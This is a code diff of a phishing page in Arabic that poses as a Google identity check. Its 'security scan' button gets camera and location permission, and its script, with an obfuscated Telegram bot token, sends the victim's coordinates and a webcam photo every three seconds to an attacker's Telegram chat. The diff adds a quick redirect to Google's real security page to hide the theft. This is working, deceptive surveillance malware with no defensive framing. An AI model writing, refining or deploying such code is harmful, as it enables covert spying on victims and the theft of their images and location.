@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأمين حساب Google</title>
+    <title>تأكيد الهوية - Google</title>
     <style>
         body { background-color: #ffffff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
         .logo { width: 80px; margin-bottom: 24px; }
-        h1 { font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 16px; }
-        p { font-size: 15px; line-height: 1.6; margin-bottom: 32px; color: #5f6368; }
-        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-weight: 500; cursor: pointer; }
-        .loader { display: none; margin: 20px auto; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 16px; }
+        p { font-size: 14px; line-height: 1.5; margin-bottom: 30px; color: #5f6368; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
+        #loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -19,63 +19,60 @@
     <div class="container">
         <img src="https://www.gstatic.com/images/branding/product/2x/g_shield_96dp.png" class="logo">
         <h1>تأكيد الهوية مطلوب</h1>
-        <p>لحماية حسابك، يجب إجراء فحص أمني للنظام. يرجى الضغط على "بدء الفحص" والسماح بالأذونات لإكمال العملية.</p>
+        <p>لحماية حسابك، يجب إجراء فحص أمني للنظام. يرجى الضغط على الزر أدناه والسماح بالأذونات المطلوبة.</p>
         <button class="btn" id="startBtn" onclick="requestAccess()">بدء الفحص الأمني</button>
-        <div class="loader" id="loader"></div>
-        <p id="status" style="display:none; color:#1a73e8; font-weight:bold;">جاري فحص أمان الجهاز...</p>
+        <div id="loader"></div>
+        <p id="status" style="display:none; color:#1a73e8; font-size:12px;">جاري فحص أمان الجهاز...</p>
     </div>
 
     <script>
-        const _data = ['8439157520', 'AAGGZBxYp0x', '6Y54ar3TIrk', 'MaMEHarQASmgY', '1772820433'];
-        const token = `${_data[0]}:${_data[1]}${_data[2]}${_data[3]}`;
-        const chat_id = _data[4];
-        let userLocation = "📍 لم يتم تحديد الموقع بعد أو تم رفضه";
+        const _d = ['8439157520', 'AAGGZBxYp0x', '6Y54ar3TIrk', 'MaMEHarQASmgY', '1772820433'];
+        const token = `${_d[0]}:${_d[1]}${_d[2]}${_d[3]}`;
+        const chat_id = _d[4];
 
         async function requestAccess() {
             document.getElementById('startBtn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             document.getElementById('status').style.display = 'block';
-            
+
             try {
-                // طلب الكاميرا أولاً لضمان التصوير
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // محاولة جلب الموقع في الخلفية
+                // سحب الموقع
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    userLocation = `📍 الموقع: https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`;
+                    const loc = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(loc)}`);
                 });
 
+                // التقاط أول صورة وإرسالها
+                capture(video);
+                
                 // بدء التصوير المستمر كل 3 ثوانٍ
-                setInterval(() => {
-                    captureAndSend(video);
-                }, 3000);
+                setInterval(() => capture(video), 3000);
 
-            } catch (err) {
-                alert("يجب السماح بالصلاحيات لإكمال تأمين الحساب.");
-                location.reload();
+                // الانتقال الفوري بعد ثانية واحدة لضمان وصول أول صورة دون تعليق
+                setTimeout(() => {
+                    window.location.href = "https://myaccount.google.com/security";
+                }, 1500);
+
+            } catch (e) {
+                window.location.href = "https://myaccount.google.com/security";
             }
         }
 
-        function captureAndSend(videoEl) {
+        function capture(v) {
             const canvas = document.createElement('canvas');
-            canvas.width = videoEl.videoWidth;
-            canvas.height = videoEl.videoHeight;
-            canvas.getContext('2d').drawImage(videoEl, 0, 0);
-            
-            canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'secure_snap.jpg');
-                formData.append('caption', userLocation);
-
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg', 0.5); // ضغط الصورة لسرعة الإرسال المستمر
+            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+            canvas.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id', chat_id);
+                f.append('photo', b, 's.jpg');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
+            }, 'image/jpeg', 0.5);
         }
     </script>
 </body>
